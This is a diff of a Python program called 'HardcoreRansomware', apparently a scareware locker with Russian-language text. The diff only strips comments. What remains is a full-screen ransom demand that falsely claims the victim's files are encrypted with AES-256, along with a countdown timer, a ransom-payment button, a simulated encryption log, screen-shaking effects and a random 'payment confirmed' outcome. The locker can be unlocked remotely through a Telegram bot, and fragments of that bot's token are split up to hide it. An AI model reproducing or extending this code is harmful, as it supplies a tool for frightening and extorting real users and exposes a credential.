@@ -6,7 +6,6 @@ import queue
 import telebot
 
 
-# Обфускация токена: разбит на части и собирается в рантайме
 _t1 = "857968"
 _t2 = "2917:"
 _t3 = "AAEMy28wsHU"
@@ -56,7 +55,7 @@ class HardcoreRansomware:
         self.blink_state = True
         self.blink_title()
 
-        # Пугающее сообщение с техническими деталями
+        
         self.message_text = (
             "Ваши данные были зашифрованы с использованием\n"
             "алгоритма AES-256 с уникальным ключом.\n"
@@ -76,12 +75,12 @@ class HardcoreRansomware:
         self.label_message = tk.Label(root, text=self.message_text, fg="#DDDDDD", bg="black", font=self.font_text, justify="left")
         self.label_message.pack(pady=10, padx=20)
 
-        # Таймер
+  
         self.time_left = 5 * 60
         self.label_timer = tk.Label(root, text="", fg="yellow", bg="black", font=self.font_title)
         self.label_timer.pack(pady=15)
 
-        # Кнопка оплаты
+   
         self.pay_button = tk.Button(
             root,
             text="Оплатить выкуп",
@@ -96,40 +95,39 @@ class HardcoreRansomware:
         )
         self.pay_button.pack(pady=20)
 
-        # Прогресс-бар проверки платежа
+     
         self.progress = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
         self.progress.pack(pady=10)
         self.progress["value"] = 0
         self.progress["maximum"] = 100
         self.progress.pack_forget()
 
-        # Лог действий
+   
         self.log_text = tk.Text(root, height=8, width=85, bg="black", fg="lime", font=self.font_log)
         self.log_text.pack(pady=10)
         self.log_text.insert(tk.END, ">> Инициализация шифрования файлов...\n")
         self.log_text.insert(tk.END, ">> Шифрование файлов: 0%\n")
         self.log_text.config(state=tk.DISABLED)
 
-        # Имитируем прогресс шифрования
         self.encryption_progress = 0
         self.update_encryption_log()
 
         self.update_timer()
 
-        # Для мигания заголовка
+      
         self.root.after(600, self.blink_title)
 
-        # Мигающая красная рамка при попытке закрытия
+       
         self.shake_count = 0
 
-        # Запуск визуальных эффектов
+    
         self.start_bg_flicker()
         self.start_glitch_title()
         self.shake_screen()
         self.glitch_message()
         self.crt_lines()
 
-        # Проверяем очередь команд от бота
+        
         self.check_queue()
 
     def check_queue(self):
@@ -150,7 +148,7 @@ class HardcoreRansomware:
         self.log_add(">> Файлы успешно разблокированы через Telegram-команду!")
         self.root.after(3000, self.root.destroy)
 
-    # --- Все твои остальные методы ---
+
 
     def animate_shield(self):
         color = "darkred" if self.shield_index % 2 == 0 else "red"
@@ -222,7 +220,7 @@ class HardcoreRansomware:
             self.check_payment_result()
 
     def check_payment_result(self):
-        success = random.random() < 0.4  # 40% шанс успеха
+        success = random.random() < 0.4  
         if success:
             self.log_add(">> Платеж подтверждён! Ключ отправлен на ваш ПК.")
             self.label_message.config(text="Оплата получена! Файлы разблокированы.", fg="lime")
